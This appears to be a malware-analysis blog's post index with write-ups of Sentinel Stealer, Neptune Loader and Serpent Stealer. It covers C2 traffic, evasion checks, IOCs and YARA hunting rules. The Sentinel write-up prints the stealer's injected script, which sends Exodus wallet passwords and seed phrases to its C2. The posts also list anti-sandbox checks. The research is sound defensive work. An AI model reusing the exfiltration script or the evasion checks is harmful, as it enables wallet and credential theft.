@FalconFeedsio.A quick search on Google using the keywords ‘sentinel stealer’ leads to a website named sentinelware.net. This site serves as a marketplace for selling the malware and a hub for collecting logs. It offers options to Register, Login, and Purchase, along with a link to a tutorial video on YouTube.The website for Sentinel Stealer lists its key features: Browser Recovery Communication Crypto Recovery Game Recovery FTP/SSH Recovery Wallet Injection Electron Injection Dotnet InjectionPart 2 - Dissecting the First Sentinel SampleOur next step involves finding a malware sample associated with the Sentinel Stealer by searching for the sentinelware.net domain on VirusTotal. This will allow us to explore its network of relations. As a SAAS (Stealer as a Service) platform, it is highly likely that we will find malware samples connected to this domain, which we can then analyze in detail.In our analysis of the Relations tab for sentinelware.net on VirusTotal, we identified 69 files linked to this domain, as of the time this article was written.Let’s choose one of these files and begin our analysis.SHA256: b177f7a7c764f96b6f60eea74014b18af23129f92c9ed34a76a46a0e111b5e26Exeinfo output for SentinelDummyMalware.exeMS Visual C# / Basic.NET [ Obfus/Crypted ]Exeinfo indicates that the file is a .NET application, so we open it in DNSpy for analysis. However, we observe that the class names, function names, and other elements in DNSpy look like garbage, indicating potential obfuscation.By running de4dot on this obfuscated file, we successfully deobfuscate it, revealing more readable and understandable names.Across different Sentinel Stealer samples, we observed a recurring theme: numerous resources bear the ‘costura’ prefix, like ‘costura.costura.pdb.compressed.’ This consistent presence of Costura-prefixed resources is indicative of a deliberate strategy to embed and compress critical dependencies within the malware, enhancing its stealth and hindering straightforward analysis.In our analysis of the first function within the Main module, named Class5.smethod_5(), it’s observed that this function retrieves the MAC address and public IP address of the device. This data is then sent to the /AntiScanner/VirusTotal path on the C2 server. This approach is part of a strategy employed by the threat actor. By uploading over 100 SentinelDummyMalware.exe files to VirusTotal, they aim to gather IP and MAC data from VirusTotal’s virtual machines. This data collection is a strategic move to develop targeted anti-analysis techniques specifically for VirusTotal.After examining this file and several other samples for comparison, we identified a more informative version for analysis. Recall the Stealer-cleaned.dll file from our VirusTotal investigation – this file encompasses a broader range of functionalities. Therefore, instead of focusing on SentinelDummyMalware files, we will shift our analysis to Stealer-cleaned.dll.SHA256: 4e8cb27f3b3b7ddf9e4276aa2902f25c37d12dc5e5ba54a7b9e2f190bfea96fcThe suffix -cleaned in its name suggests it has already been processed with de4dot. We can confirm it in DNSpy.Let’s start by analyzing the Class10.smethod0() method within Sentinel Stealer. This method is designed to create a folder in a randomly selected location, using a predefined list. It first selects a random directory from Struct0.list_1, which contains only the \\AppData\\Local folder. Then, it picks an option from Struct0.list_2, which includes choices like &#39;Microsoft&#39; ,&#39;Microsoft OneDrive&#39; and &#39;Intel&#39; . After establishing the primary folder location under \\AppData\\Local, the method proceeds to prepare paths for various subfolders, specifically named &#39;Browser&#39; , &#39;Communication&#39; , &#39;Crypto&#39; , &#39;Game&#39; and &#39;FTP&#39; . These paths are set up for organizing different categories of stolen data, although the subfolders themselves are not created at this stage.In Sentinel Stealer, Class8.smethod_0() represents an asynchronous operation, a technique used to improve program efficiency. We will now analyze this method to understand its role and functionality within the malware, particularly focusing on its contribution to asynchronous tasks and how it fits into the stealer’s overall process.The Class8.smethod_0() method initially reads data from a resource named Sentinel.EncryptedIcon, which is encoded in base64. This data is intended for AES decryption. To proceed with decrypting this resource data, our next step is to locate the AES Key and IV (Initialization Vector), which are essential for the decryption process.To obtain the AES Key and IV values from the C2 server, the malware constructs an HTTPS request targeting the /SentinelC2/GetKey path. This request includes two parameters: shh and username. The shh parameter is an integer that appears to be randomly generated. In contrast, the username parameter is derived through AES decryption of a separate resource named Sentinel.SmallerEncryptedIconGiven that the AES Key and IV values are hardcoded within the malware, we have the capability to manually decrypt the encrypted resource. This allows for a direct approach to uncovering the data concealed within the Sentinel.SmallerEncryptedIconWe discovered that the username value used by the malware is ConorJames . To observe the malware’s network behavior, we could run the sample and monitor the generated traffic. However, since it uses HTTPS, this traffic would be encrypted. An alternative approach is to run the sample in a debugger, force the traffic to downgrade to HTTP, and then use tools like fakedns and netcat listener to capture all the POST requests. While reverse engineering could provide insights into how these requests are created, the complexity of the code, as showed in the included screenshot, makes this a challenging option.After executing the malware in a debugger and successfully downgrading its traffic from HTTPS to HTTP, we were able to capture the details of the POST request it generates.POST /SentinelC2/GetKey HTTP/2Host: sentinelware.netContent-Type: multipart/form-data; boundary=&quot;f22be721-0ba4-47bd-b412-1bc1ba7a028c&quot;Content-Length: 329Expect: 100-continue--f22be721-0ba4-47bd-b412-1bc1ba7a028cContent-Type: application/json; charset=utf-8Content-Disposition: form-data; name=shh547560--f22be721-0ba4-47bd-b412-1bc1ba7a028cContent-Type: application/json; charset=utf-8Content-Disposition: form-data; name=usernameConorJames--f22be721-0ba4-47bd-b412-1bc1ba7a028c--Unfortunately, as of the time this article is being written, the C2 server is not responding to our GetKey request. This lack of response means our malware sample is unable to function as intended. Additionally, there are no other operational samples available on VirusTotal. Consequently, our analysis will proceed by bypassing certain aspects of the malware that require the AES Key and IV from the C2 server, focusing instead on dissecting and understanding other functionalities of the malware.Sentinel Stealer stands out from standard stealers with its support for Electron and Wallet Injection. If enabled during the malware’s build process, it can unpack .asar packages and inject malicious scripts, adding a sophisticated layer to its capabilities.As you can see in the screenshot, Sentinel Stealer checks for the existence of an app.asar file in the Exodus installation path. If this file is present, the malware unpacks it and injects a malicious script. The purpose of this script is to steal sensitive data such as the Exodus Password and Exodus Mnemonic.The malicious script injected by Sentinel Stealer is programmed to transmit the stolen data to the /SentinelC2/Exodus path at the C2 server’s address.const request = new XMLHttpRequest();const url = &quot;https://sentinelware.net/SentinelC2/Exodus&quot;;request.open(&quot;POST&quot;, url);const formData = new FormData();formData.append(&quot;ExodusPassword&quot;, e);formData.append(&quot;ExodusMnemonic&quot;, this._seed.mnemonicString);formData.append(&quot;username&quot;,&quot;%USERNAME%&quot;);formData.append(&quot;uid&quot;, &quot;%UID%&quot;);request.send(formData);If activated, Sentinel Stealer can also target Discord by injecting malicious code using a technique similar to the one described earlier.Although the original code of this script is extensive, over 600 lines, a brief summary of its functions is more practical. It’s programmed to capture sensitive data during user activities such as logins, sign-ups, credit card records, and password changes. The script then sends this stolen data to the C2 server via the paths /SentinelC2/Injection and /SentinelC2/CDN/Injection.Since the remainder of the file exhibits standard stealer characteristics, we’ll skip the detailed analysis. It’s designed to steal browser data, FTP/SSH credentials, wallet data, and more. Below is the list of applications specifically targeted by the malware for data extraction.Wallets Exodus Electrum Bytecoin Guarda Coinomi Armory ZcashGames Growtopia SteamBrowsers Chromuim Google Chrome Edge Opera GX Opera Iridium ChromePlus 7Star Cent Browser Chedot Vivaldi Kometa Elements Browser Epic Privacy Browser Sleipnir Citrio Coowon Liebao QIP Surf Orbitum Comodo Dragon Amigo Torch Yandex 360Browser Maxthon3 K-Melon Sputnik Nichrome CocCoc Chromodo Mail.Ru Atom Brave Browser FirefoxCommunication DiscordFTP/SSH FileZilla WinSCPIn its final operation, Sentinel Stealer obtains the public IP address of the infected device by sending a request to ipapi.co. Following this, it compiles and compresses all the collected data into a zip file, which is then transmitted to the /SentinelC2/ReceiveVictim path on the C2 server.Part 3 - C2 PanelSentinel Stealer operates as a Stealer as a Service platform, centralizing all logs on the same C2 server. Users of this service can access the C2 server by registering and logging in with their purchased license key. Lacking a license key ourselves, we will instead analyze the C2 server’s inner workings through a YouTube video shared by the developers for promotional purposes.In the video, the threat actor demonstrates an attack simulation on themselves, encompassing the creation, download, execution, and analysis of their own logs using Sentinel Stealer. Key features observed in the Builder tab include: Log Selection: Users have the option to choose which types of logs to steal. This is customizable through enabling or disabling various categories like Browser, Communication, Crypto, Games, FTP/SSH, Discord Injection, and Wallet Injection. Persistency Methods: There are choices for persistency methods available, such as Electron Injection and Dotnet Injection, allowing the malware to maintain a presence on the infected system. File Format Options: The builder allows the malware to be compiled as either an .exe file or a .bat file, offering flexibility in the mode of distribution and execution.In the malware building process depicted in the video, the threat actor opts for the .bat file format and names the file JefferyEpstein, resulting in the creation of JefferyEpstein.bat. However, a subsequent search for JefferyEpstein.bat on VirusTotal yielded no results, indicating that this specific sample has not been uploaded or identified there.After executing the JefferyEpstein.bat file, the threat actor proceeds to display the Logs Manager tab in the video, but the specific details are blurred for confidentiality. However, an inadvertent reveal occurs when the threat actor downloads and opens the zip file containing the logs. The file name, Ramirez-DESKTOP-ZMNAUDV.zip, is visible, inadvertently disclosing the hostname Ramirez-DESKTOP-ZMNAUDV associated with the logged data.Despite the reveal of the hostname Ramirez-DESKTOP-ZMNAUDV in the zip file name, our subsequent search on VirusTotal for this zip file, or any other files associated with this specific hostname, yielded no results.Part 4 - Hunting with YaraAfter thorough analysis and identification of unique characteristics in the related samples, we crafted a simple Yara rule. This rule was then utilized to conduct scans on both VirusTotal and Unpacme, aiming to detect similar patterns or instances of Sentinel Stealer.While the potential to refine our Yara rule exists with the emergence of new samples, the current rule is sufficiently robust to detect all existing samples of Sentinel Stealer available on the internet as of now.import &quot;pe&quot;rule SentinelStealer { meta: author = &quot;tufan - @tufan_gngr&quot; description = &quot;Detects .NET stealer named Sentinel Stealer&quot; date = &quot;2024-01-21&quot; references = &quot;https://tufan-gungor.github.io/&quot; strings: $s1 = &quot;SentinelC2&quot; wide fullword $s2 = &quot;sentinelware&quot; wide fullword $s3 = &quot;SentinelSteals&quot; wide fullword $s4 = &quot;ipapi.co&quot; wide fullword condition: uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and (2 of ($s*))}Following the Yara scan, we identified a total of 291 results on VirusTotal and none on Unpacme. Of these, 290 files were identified as SentinelDummyMalware.exe, likely uploaded to gather IP/MAC data from VirusTotal’s analysis environment. The remaining file was the Stealer-cleaned.dll, which we previously analyzed in detail.In addition to our Yara rule-based search, we conducted searches using specific strings such as this._loadLightningCreds();, /SentinelC2/ReceiveVictim, and /SentinelC2/Injections. However, these string searches did not yield any new results beyond what we had already identified.Part 5 - IOCssentinelware. https://twitter.com/FalconFeedsio/status/1748260587627495540 https://twitter.com/DailyDarkWeb/status/1748450257019814069I utilized AI assistance to fine-tune certain sentences in this post, enhancing clarity and precision." }, { "title": "Hunt and Analysis - Neptune Loader", "url": "/posts/neptune-loader-analysis/", "categories": "Reverse Engineering, Malware Hunting", "tags": "reverse engineering, malware hunting", "date": "2024-01-13 19:00:00 +0300", "snippet": "Part 1 - Neptune || A Native HTTP LoaderA user named m0hx shared a post on hackforums.net on November 22, 2023, promoting a loader called Neptune. In the threat actor’s exact words;“Neptune is an innovative HTTP loader project that provides robust and efficient control over computer systems through commands administered via user-friendly web panel.”On January 9th, nearly two months subsequent to the initial post, @ViriBack, a user on X (formerly Twitter), disclosed the IP addresses of three detected Neptune Loader command and control centers.After @Viriback’s post, Twitter users @banthisguy9349 and @ShanHolo also shared the Neptune Loader C2 addresses they had identified.tdboat.onlinemfuk.appPart 2 - Dissecting the First Neptune SampleBy conducting a search for the domain tdboat.online on VirusTotal and examining its associated relations, an intriguing discovery emerges: a URL containing task.php in its path.Upon examining the relationships of this URL, we uncover an associated malware named “Valorant_Cheat.exe”.Our analysis will initially focus on this particular file.SHA256: 2a3549512f5f9cf1b11a26897a79532adc548c3000fb7b07fcae6b49cd5222adExeinfo output for Valorant_Cheat.exe[ (GNU) 9.3-win32 20200320 ] - GCC MINGW-64w compiler for 32/64 bit ( exe )Upon loading this sample into IDA, we observe a sizable data blob in the section named .UH2oS6N. Additionally, the IDA Navigator reveals a notably small code area, which typically implies two potential scenarios: the file is either packed or encrypted.The function sub_401530, identified during our examination of calls made by the start function, exhibits compelling behavior. It dynamically loads USER32.dll and retrieves the VirtualAlloc function. The function then allocates new memory with PAGE_EXECUTE_READWRITE permissions (0x40) and uses memcpy to transfer data from the .UH2oS6N section into this allocated space. Finally, it shifts execution to the beginning of this newly written section, a technique commonly seen in unpacking or decrypting executable code.The unmodified transfer of data from the .UH2oS6N section to the allocated memory, followed by a change in the execution flow to this area, suggests that the .UH2oS6N section could contain executable code instead of data. We can confirm this in IDA by transforming this section’s data into code, enabling a deeper examination of its contents.Transforming the initial part of the ‘.UH2oS6N’ section into code within IDA, we quickly notice a call to ‘sub_4AF27C’. Intriguingly, this function employs rotational (ror/rol) and XOR techniques for decryption, suggesting complex encryption mechanisms at play.Rather than dedicating time to statically dissecting this routine in IDA, a more efficient approach would be to open the file in a debugger. This allows the decryption process to unfold naturally, enabling us to observe the decrypted code directly.Unpacking / DecryptionIn x64dbg, to reach the same point of analysis as in IDA, these steps should be followed: Initially, place a breakpoint on VirtualAlloc. Proceed to run the code until this breakpoint is hit. Continue running the code until it completes the return, then step over to revert to the user code. This process will bring us to the crucial moment where the .UH2oS6N section is written into the allocated memory, and the execution is redirected there.For deeper analysis, the next step in x64dbg involves running the code up to the call eax instruction at the address 0040165F. Once there, use ‘Step into’ (F7) to delve into the function being called. There are few more xor decryptions.Continuing to run the code step by step in x64dbg, while keeping a close eye on the allocated memory, reveals the unfolding decryption. Intriguingly, this process gradually uncovers the ‘MZ’ and ‘PE’ headers, hallmarks of executable files, signifying that the decrypted data forms a valid executable structure.At this point, we have a few options: Continue analysis in the debugger, which is quicker but lacks decompiling features and might face anti-debugger methods. Extract and examine a memory dump of the executable, which may involve fixing the Import Address Table (IAT). Use Unpacme to automatically extract the unpacked child process.Later in this article, we will uncover that this is the Amber Reflective PE Packer.Analysis of Unpacked SampleAfter successfully unpacking the file using one of the recommended methods, we can proceed to analyze the unpacked sample in IDA.The function ‘sub_7FF16612’, called immediately in the WinMain function, primarily checks for the presence of a debugger. It begins by calling IsDebuggerPresent and CheckRemoteDebuggerPresent to detect debugging environments. Additionally, it employs a timing check using QueryPerformanceCounter and Sleep to identify unusually fast execution, which could indicate a debugger’s presence. If any of these checks suggest debugging, the function triggers a breakpoint with __debugbreak. The use of multiple debugger detection techniques indicates a deliberate effort to hinder reverse engineering or analysis in a debugging environment.In the scenario where no debugger is detected and the code executes successfully, the WinMain function proceeds to create a mutex with the name d6d8c8d7-eacb-dc01-35aa-e872082a1ca1. It then checks for creation failure, specifically for the error code 183, which corresponds to ERROR_ALREADY_EXISTS. This check is a safeguard to prevent the program from running multiple instances on the same computer. If this specific error is encountered, indicating that the mutex already exists, the program halts, effectively preventing duplicate executions.If the program bypasses the mutex check, indicating that error 183 (&#39;ERROR_ALREADY_EXISTS&#39;) is not present, it initiates multiple threads. First, a thread is created with CreateThread, invoking the function sub_7FF116B2 with the argument REGISTER. Following this, two additional threads are created, both calling sub_7FF116B2 and sub_7FF11932, respectively, each with the argument GETCMD. The program then waits for the first thread to complete using WaitForSingleObject with an infinite timeout (0xFFFFFFFF). Finally, it returns 0, concluding this sequence of operations. REGISTER (sub_7FF116B2)In the REGISTER routine of the Neptune malware, a pivotal network communication is established. It sends a request to gate.php, accompanied by a password parameter.The routine’s extensive scope and complexity make it too large to fit within the confines of a single screenshot in IDA Graph, prompting the use of a decompiler for more effective visualization and detailed analysisThis step acts as a verification process with the command and control (C2) server. A correct password elicits a response of Gate is open from the C2, indicating successful entry. On the other hand, an incorrect password triggers a redirection to index.php, serving as a gatekeeping mechanism.“Once the ‘Gate is open’ response is received from the C2 server, indicating successful password verification, Neptune proceeds to the next stage. It sends a request to ‘addbot.php’, this time with a set of specific parameters:&amp;amp;lan=&amp;amp;macAddress=&amp;amp;port=&amp;amp;computerName=&amp;amp;userName=&amp;amp;osName=&amp;amp;country=&amp;amp;language=&amp;amp;latitude=&amp;amp;longitude=&amp;amp;timezone=&amp;amp;isAdmin=&amp;amp;isLaptop=&amp;amp;idle=&amp;amp;version=v&amp;amp;tag=&amp;amp;note=&amp;amp;antivirus=&amp;amp;antivirus=None&amp;amp;dotNETFramework=&amp;amp;dotNET=&amp;amp;java=&amp;amp;sandboxie=&amp;amp;vmware=&amp;amp;virtualbox=&amp;amp;sandbox=&amp;amp;osType=&amp;amp;osBit=&amp;amp;exeBit=&amp;amp;exePath=&amp;amp;ram=&amp;amp;cpuno=&amp;amp;cpuName=&amp;amp;gpuName=&amp;amp;ramUsg=&amp;amp;cpuUsg=As part of its device information gathering process, the malware conducts a thorough check for the presence of antivirus software on the computer. It methodically scans through a predefined list of antivirus programs,The list of antivirus software was retrieved from this GitHub repository.The malware’s detection capabilities extend to identifying sandbox environments. It scrutinizes the process list for the presence of SandMan.exe and SbieCtrl.exe, both indicative of sandboxing. Additionally, it probes the system’s registry for the key HKLM_SOFTWARE\\Sophos\\Sandboxie, a telltale sign of a sandbox setup.Neptune initiates its virtualization detection by checking the cpuid instruction, a common method for identifying virtual machine environments. Following this, it employs a comprehensive strategy that includes process enumeration, registry key examination, and targeted file and library probes. Specifically, it seeks out the VBoxService.exe process, scrutinizes registry entries for VirtualBox-related information, and tests access to files and libraries unique to VirtualBox. This layered approach, starting from CPU instruction analysis to specific system checks, ensures a thorough and effective verification to determine if the malware is running in a virtualized setting.cpuidSOFTWARE\\\\Sophos\\\\SandboxieSOFTWARE\\\\VMware, Inc.SOFTWARE\\\\Oracle\\\\VirtualBox Guest AdditionsSOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\VirtualizationVBoxService.exeHARDWARE\\\\ACPI\\\\DSDT\\\\VBOX__\\\\\\\\.\\\\VBoxMiniRdrDNVBoxHook.dll GET_CMD (sub_7FF116B2, sub_7FF11932)In the next phase of operation, the GETCMD routine engages in regular communication with the C2 server. It does so by periodically dispatching requests to tasks.php, each tagged with a bid parameter that serves as the bot’s identification. This process is essential for the malware to receive and execute commands or tasks that the C2 server may have pending, maintaining its operational alignment with the server’s objectives.Below is a screenshot showcasing the full range of commands supported by the malware.Securing its communication channels, the Neptune malware implements AES (Rijndael) encryption, a step that comes into play after thorough parameter preparation.Part 3 - C2 PanelAs we move into Part 3 of our analysis, focusing on the C2 Panel, we encounter key contributions from the cybersecurity community. On January 9, following @ViriBack’s initial tweet on the topic, @0xperator further expanded our understanding by posting several screenshots on January 10 that reveal the inner workings of the Neptune C2 Panel.You can find the original post here.To uncover C2 panels linked to Neptune, we utilize various online services like Shodan, FOFA, and Censys. In this context, we concentrate on Censys. By examining known C2 addresses we can select few specific point to use in our query. Here is 3 example queries;services.http.response.favicons.md5_hash=&quot;39705673fd05bd34b425d495ed8471c9&quot;services.software.uniform_resource_identifier: &quot;cpe:2.3:a:neptune-loader:neptune-loader:*:*:*:*:*:*:*:*&quot;services.http.response.body_hash=&quot;sha1:85cc188de3d85d423ef3f5f1cd1f6955c1d575d2&quot;As of the time when this article was written, our Censys search queries have unveiled four IP addresses connected to the Neptune C2 Panel.Part 4 - Hunting with YaraAs we embark on the journey to uncover more Neptune samples, we will develop two YARA rules. The first rule is aimed at detecting the packed sample, while the second rule is optimized for identifying the unpacked variant. Yara Rule for Packed SampleWhile examining the distinctive traits of the packed sample, several noteworthy characteristics emerge. Typically, the packed sample exhibits more than seven sections, one of which bears a randomly generated seven-character name and often possesses an entropy value exceeding seven. Additionally, this section tends to have a substantial size. The packer employs VirtualAlloc to allocate memory, utilizes memcpy for copying data from this section to the allocated memory, and concludes with a call to eax signifying the start of the newly allocated memory.Our YARA rule adopts a somewhat aggressive approach by verifying if the entropy of the specific section exceeds 7 and if its size surpasses 240,000. While it is possible to lower these thresholds in certain scenarios, doing so may increase the likelihood of encountering false positives.import &quot;pe&quot;import &quot;math&quot;rule NeptuneLoader_Packed_Amber { meta: author = &quot;tufan - @tufan_gngr&quot; description = &quot;Detects Amber PE Reflective Packer used on Neptune Loader&quot; date = &quot;2024-01-14&quot; references = &quot;https://tufan-gungor.github.io/&quot; strings: $s1 = &quot;VirtualAlloc&quot; $s2 = &quot;memcpy&quot; $s3 = {E8 70 10 00 00 8B 45 D4 FF D0} // call eax, following by memcpy $s4 = {E8 7? 52 0A 00} // immediate call in encrypted section condition: uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and pe.number_of_sections &amp;gt; 7 and for any j in (0..pe.number_of_sections - 1): ( math.entropy(pe.sections[j].raw_data_offset, pe.sections[j].raw_data_size) &amp;gt;= 7 and pe.sections[j].raw_data_size &amp;gt;= 0x0003A980 and pe.sections[j].name matches /\\.[A-Za-z0-9]{7}/ ) and 3 of them}After running RetroHunt in VirusTotal with this Yara rule to find related samples, it yields numerous matches. Upon examining the characteristics of these files, there are suggestive similarities that might point to a potential association with an edited version reminiscent of the Amber Reflective PE packer.While we refer to it as an ‘edited’ version, it’s important to note that YARA rules crafted by other researchers for detecting Amber do not align with the packed Neptune samples. However, the YARA rule designed specifically for packed Neptune samples has shown matches with files that have been packed using Amber.All the packed samples share similar technical characteristics, including a seven-character-long section with encrypted data, among others. However, it’s worth noting that there are no strings or indicators explicitly related to Amber in these samples.Given these circumstances, hunting Neptune samples by concentrating on its packer proves challenging. If the packer is identified as Amber, it can lead to numerous false positives. Therefore, our focus will shift towards the unpacked sample. Yara Rule for Unpacked SampleAs you may recall, the unpacked sample reveals numerous distinct characteristics, including AV checks, VM checks, anti-debugging measures, C2 communication, and more. With this wealth of specific functions and behaviors, we can pinpoint and utilize particular strings associated with these functions to construct our YARA rule.rule NeptuneLoader_Unpacked { meta: author = &quot;tufan - @tufan_gngr&quot; description = &quot;Detects unpacked sample of Neptune Loader&quot; date = &quot;2024-01-14&quot; references = &quot;https://tufan-gungor.github.io/&quot; strings: $s1 = &quot;REGISTER&quot; $s2 = &quot;GETCMD&quot; $s3 = &quot;httpflood&quot; $s4 = &quot;visitpagehidden&quot; $s5 = &quot;&amp;amp;sandboxie=&quot; $s6 = &quot;&amp;amp;isLaptop=&quot; $s7 = &quot;addbot.php&quot; $s8 = &quot;tasks.php&quot; $s9 = &quot;SOFTWARE\\\\VMware&quot; $s10 = &quot;SOFTWARE\\\\Oracle\\\\VirtualBox&quot; $s11 = &quot;Gate is open&quot; condition: uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and 7 of them}As our hunt primarily revolves around locating unpacked Neptune samples, we will deviate from the conventional approach of utilizing VirusTotal and initiate our search on Unpacme.Upon running the Yara Hunt on Unpacme using our Yara rule, it flags three matches. Notably, the first two matches were as expected, representing samples employed within the ongoing campaign we are investigating. These files closely resemble the ones we’ve previously examined.However, the third file stands out as significantly distinct from the files we’ve previously analyzed. This particular file is a .NET executable named ‘ablast.exe,’ and it unfolds the Neptune sample after processing several others.SHA256: f98cf9ee6e3f42fe35ec570b4728ecd65929ba24ba4c090c3b438c8de4677cc8 (packed parent)SHA256: cf70fa1d010f0077ccb4ff039f3764c47756113a7bcc28acbd5f96d6df56e9a7 (unpacked child)Upon examining the packed parent of this file on Tria.ge and VirusTotal, it becomes apparent that this particular sample is a variant of zgRAT. Intriguingly, following the unpacking process, it proceeds to execute Neptune.In examining its relations on VirusTotal, we notice a familiar network traffic.Part 5 - IOCs2a3549512f5f9cf1b11a26897a79532adc548c3000fb7b07fcae6b49cd5222adf98cf9ee6e3f42fe35ec570b4728ecd65929ba24ba4c090c3b438c8de4677cc8cf70fa1d010f0077ccb4ff039f3764c47756113a7bcc28acbd5f96d6df56e9a7f98cf9ee6e3f42fe35ec570b4728ecd65929ba24ba4c090c3b438c8de4677cc891.92.240.15391.92.240.152194.33.191.10691.92.252.794.156.65.54mfuk.apptdboat.onlineruspyc.topReferences https://hackforums.net/showthread.php?tid=6256979 https://twitter.com/ViriBack/status/1744726264618119591 https://twitter.com/ShanHolo/status/1744740555203203074 https://twitter.com/banthisguy9349/status/1744772559730593998 https://twitter.com/0xperator/status/1745176382915695096I utilized AI assistance to fine-tune certain sentences in this post, enhancing clarity and precision." }, { "title": "Hunt and Analysis - Serpent Stealer", "url": "/posts/serpent-stealer-analysis/", "categories": "Reverse Engineering, Malware Hunting", "tags": "reverse engineering, malware hunting", "date": "2024-01-06 19:00:00 +0300", "snippet": "Part 1 - Dissecting the First Serpent Stealer SampleOn October 15, 2023, a new malware named Serpent Stealer was showcased on Breach Forums by a user named stealth. This malware, categorized as a standard stealer, deviates from the norm in its operational tactics. Unlike others that rely on a command and control (C2) server, the ‘Serpent Stealer’ utilizes a Discord webhook for its functionality, as highlighted by its developer.An extensive search on VirusTotal using keywords such as SerpentStealer led to the discovery of the first sample of Serpent Stealer, known by the filename Serpent.dll This sample was first recorded on October 12, 2023. In the first part of our article, we delve into an in-depth analysis of this particular file, unraveling its characteristics and behavior.SHA256: 5ff20ad3f1b84b6e702bed2a9ff8e0510615a1d60dd123a9d3cbd1d9e2b5357dExeinfo output for Serpent.dllx64 .NET exe file with : 00 Entry Point - CPU : AMD64 - code size : 34.5 KBThe analysis of ‘Serpent.dll’ began with EXEinfo, which classified it as a .NET file. This led us to examine it in DNSpy, specifically the Main function. Initial observations revealed that the stealer followed a basic, almost ‘copy/paste’ methodology. Remarkably, it was devoid of complexities like obfuscation and encryption, leaving it unprotected and relatively simple in design.A particular string within the Main function of Serpent.dll drew our attention; the function steamClient.GetSteam() included a hardcoded directory path C:\\\\Users\\\\Aperx\\\\Desktop. This detail suggests that the malware developer might have used this path for testing purposes and inadvertently left it in the code. We plan to leverage this specific string in our subsequent search for related samples.C:\\\\Users\\\\Aperx\\\\DesktopAnti-Analysis TechniquesThe malware incorporates two distinct anti-analysis techniques: AntiVT and AntiAV. However, considering that the VirusTotal detection score for this file stands at 41 out of 72, it’s apparent that these functions didn’t perform as effectively as intended.1. AntiVT.IsVirusTotal()In its initial layer of defense, the malware uses an anti-analysis function named AntiVT.IsVirusTotal(). This function involves a simple yet specific check: it compares the computer’s name with a predefined list of 126 names, all hardcoded by the malware’s creator. Should there be a match with any name in the list, the malware automatically ceases to function. This is a basic tactic to avoid analysis.&quot;05h00Gi0&quot;,&quot;3u2v9m8&quot;,&quot;43By4&quot;,&quot;4tgiizsLimS&quot;,&quot;6O4KyHhJXBiR&quot;,&quot;7wjlGX7PjlW4&quot;,&quot;8Nl0ColNQ5bq&quot;,&quot;8VizSM&quot;,&quot;Abby&quot;,&quot;Amy&quot;,&quot;AppOnFlySupport&quot;,&quot;ASPNET&quot;,&quot;azure&quot;,&quot;BUiA1hkm&quot;,&quot;BvJChRPnsxn&quot;,&quot;cM0uEGN4do&quot;,&quot;cMkNdS6&quot;,&quot;DefaultAccount&quot;,&quot;dOuyo8RV71&quot;,&quot;DVrzi&quot;,&quot;e60UW&quot;,&quot;ecVtZ5wE&quot;,&quot;EGG0p&quot;,&quot;Frank&quot;,&quot;fred&quot;,&quot;G2DbYLDgzz8Y&quot;,&quot;george&quot;,&quot;GjBsjb&quot;,&quot;Guest&quot;,&quot;h7dk1xPr&quot;,&quot;h86LHD&quot;,&quot;Harry Johnson&quot;,&quot;HEUeRzl&quot;,&quot;hmarc&quot;,&quot;ICQja5iT&quot;,&quot;IVwoKUF&quot;,&quot;j6SHA37KA&quot;,&quot;j7pNjWM&quot;,&quot;John&quot;,&quot;jude&quot;,&quot;Julia&quot;,&quot;kEecfMwgj&quot;,&quot;kFu0lQwgX5P&quot;,&quot;KUv3bT4&quot;,&quot;Lisa&quot;,&quot;lK3zMR&quot;,&quot;lmVwjj9b&quot;,&quot;Louise&quot;,&quot;Lucas&quot;,&quot;mike&quot;,&quot;Mr.None&quot;,&quot;noK4zG7ZhOf&quot;,&quot;o6jdigq&quot;,&quot;o8yTi52T&quot;,&quot;OgJb6GqgK0O&quot;,&quot;patex&quot;,&quot;PateX&quot;,&quot;Paul Jones&quot;,&quot;pf5vj&quot;,&quot;PgfV1X&quot;,&quot;PqONjHVwexsS&quot;,&quot;pWOuqdTDQ&quot;,&quot;PxmdUOpVyx&quot;,&quot;QfofoG&quot;,&quot;QmIS5df7u&quot;,&quot;QORxJKNk&quot;,&quot;qZo9A&quot;,&quot;RDhJ0CNFevzX&quot;,&quot;RGzcBUyrznReg&quot;,&quot;S7Wjuf&quot;,&quot;server&quot;,&quot;SqgFOf3G&quot;,&quot;Steve&quot;,&quot;test&quot;,&quot;TVM&quot;,&quot;txWas1m2t&quot;,&quot;umyUJ&quot;,&quot;Uox1tzaMO&quot;,&quot;User01&quot;,&quot;w0fjuOVmCcP5A&quot;,&quot;WDAGUtilityAccount&quot;,&quot;XMiMmcKziitD&quot;,&quot;xPLyvzr8sgC&quot;,&quot;ykj0egq7fze&quot;,&quot;DdQrgc&quot;,&quot;ryjIJKIrOMs&quot;,&quot;nZAp7UBVaS1&quot;,&quot;zOEsT&quot;,&quot;l3cnbB8Ar5b8&quot;,&quot;xUnUy&quot;,&quot;fNBDSlDTXY&quot;,&quot;vzY4jmH0Jw02&quot;,&quot;gu17B&quot;,&quot;UiQcX&quot;,&quot;21zLucUnfI85&quot;,&quot;OZFUCOD6&quot;,&quot;8LnfAai9QdJR&quot;,&quot;5sIBK&quot;,&quot;rB5BnfuR2&quot;,&quot;GexwjQdjXG&quot;,&quot;IZZuXj&quot;,&quot;ymONofg&quot;,&quot;dxd8DJ7c&quot;,&quot;JAW4Dz0&quot;,&quot;GJAm1NxXVm&quot;,&quot;UspG1y1C&quot;,&quot;equZE3J&quot;,&quot;BXw7q&quot;,&quot;lubi53aN14cU&quot;,&quot;5Y3y73&quot;,&quot;9yjCPsEYIMH&quot;,&quot;GGw8NR&quot;,&quot;JcOtj17dZx&quot;,&quot;05KvAUQKPQ&quot;,&quot;64F2tKIqO5&quot;,&quot;7DBgdxu&quot;,&quot;uHUQIuwoEFU&quot;,&quot;gL50ksOp&quot;,&quot;Of20XqH4VL&quot;,&quot;tHiF2T&quot;,&quot;sal.rosenburg&quot;,&quot;hbyLdJtcKyN1&quot;,&quot;Rt1r7&quot;,&quot;katorres&quot;,&quot;doroth&quot;,&quot;umehunt&quot;2. AntiAv.IsAvPresent()The second anti-analysis function, AntiAV.IsAvPresent(), operates by cycling through the list of running processes and comparing them with a predefined set of 53 process names. Despite its name suggesting a focus on anti-virus software, this function extends its reach to include various other processes, such as debuggers, malware analysis tools, and virtual machine processes, showcasing a broader scope of detection 